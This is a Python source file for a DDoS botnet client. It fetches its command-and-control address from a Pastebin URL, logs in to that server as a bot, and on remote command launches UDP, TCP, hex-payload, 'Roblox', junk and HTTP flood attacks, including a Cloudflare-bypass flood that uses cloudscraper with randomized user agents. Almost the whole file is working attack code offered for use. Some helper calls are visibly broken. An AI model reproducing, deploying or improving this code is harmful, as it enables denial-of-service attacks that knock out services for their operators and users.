import socket, threading, time, random, cloudscraper, requests, sys, os

def fetch_c2_info(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.text.split(":")
            c2ip = data[0].strip()
            c2port = int(data[1].strip())  # Convert port to integer
            return c2ip, c2port
        else:
            return None, None
    except Exception as e:
        return None, None

PASTEBIN_URL = "https://pastebin.com/raw/ULtN1uw5"
C2_ADDRESS = ""
C2_PORT = 0

def check_c2_info():
    global C2_ADDRESS, C2_PORT
    while True:
        new_c2_address, new_c2_port = fetch_c2_info(PASTEBIN_URL)
        if new_c2_address != C2_ADDRESS or new_c2_port != C2_PORT:
            print("C2 info has been updated. Restarting the code...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        time.sleep(10)

def main():
    global C2_ADDRESS, C2_PORT
    threading.Thread(target=check_c2_info, daemon=True).start()
    C2_ADDRESS, C2_PORT = fetch_c2_info(PASTEBIN_URL)

    base_user_agents = [
        'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
        'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
        'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4',
    ]

    def rand_ua():
        return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

    def CFB(url, secs, port):
        url = url + ":" + port
        while time.time() < secs:
            random_list = random.choice(("FakeUser", "User"))
            headers = ""
            if "FakeUser" in random_list:
                headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
            else:
                headers = {'User-Agent': f'{rand_ua("User")}'}
            scraper = cloudscraper.create_scraper()
            scraper = cloudscraper.CloudScraper()
            for _ in range(1500):
                scraper.get(url, headers=headers, timeout=15)
                scraper.head(url, headers=headers, timeout=15)

    def REQ_attack(ip, secs, port):
        ip = ip + ":" + port
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        s = requests.Session()
        while time.time() < secs:
            random_list = random.choice(("FakeUser", "User"))
            headers = ""
            if "FakeUser" in random_list:
                headers = {'User-Agent': f'{rand_ua("FakeUser")}'}
            else:
                headers = {'User-Agent': f'{rand_ua("User")}'}
            for _ in range(1500):
                requests.get(ip, headers=headers)
                requests.head(ip, headers=headers)
                scraper.get(ip, headers=headers)

    def attack_udp(ip, port, secs, size):
        while time.time() < secs:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            data = random._urandom(size)
            s.sendto(data, (ip, dport))

    def attack_tcp(ip, port, secs, size):
        while time.time() < secs:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((ip, port))
                while time.time() < secs:
                    s.send(random._urandom(size))
            except:
                pass

    def attack_tup(ip, port, secs, size):
        while time.time() < secs:
            udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            dport = random.randint(1, 65535) if port == 0 else port
            try:
                data = random._urandom(size)
                tcp.connect((ip, port))
                udp.sendto(data, (ip, dport))
                tcp.send(data)
            except:
                pass

    def attack_hex(ip, port, secs):
        payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
        while time.time() < secs:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))

    def attack_roblox(ip, port, secs, size):
        while time.time() < secs:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(size)
            dport = random.randint(1, 65535) if port == 0 else port
            for _ in range(1500):
                ran = random.randrange(10 ** 80)
                hex = "%064x" % ran
                hex = hex[:64]
                s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))

    def attack_junk(ip, port, secs):
        payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        while time.time() < secs:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))

    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    while True:
        try:
            c2.connect((C2_ADDRESS, C2_PORT))
            while True:
                c2.send('669787761736865726500'.encode())
                break
            while True:
                time.sleep(1)
                data = c2.recv(1024).decode()
                if 'Username' in data:
                    c2.send('BOT'.encode())
                    break
            while True:
                time.sleep(1)
                data = c2.recv(1024).decode()
                if 'Password' in data:
                    c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            break
        except:
            time.sleep(5)
    while True:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break
            args = data.split(' ')
            command = args[0].upper()

            if command == '!UDP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '!TCP':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '!HEX':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
            elif command == '.ROBLOX':

                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
            elif command == '!JUNK':
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
            elif command == ".HTTP_REQ":
                url = args[1]
                port = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=REQ_attack, args=(url,secs,port), daemon=True).start()
            elif command == ".HTTP_CFB":
                url = args[1]
                port = args[2]
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=CFB, args=(url,secs,port), daemon=True).start()
            elif command == 'PING':
                c2.send('PONG'.encode())

        except:
            break

    c2.close()

if __name__ == '__main__':
    try:
        main()
    except:
        pass
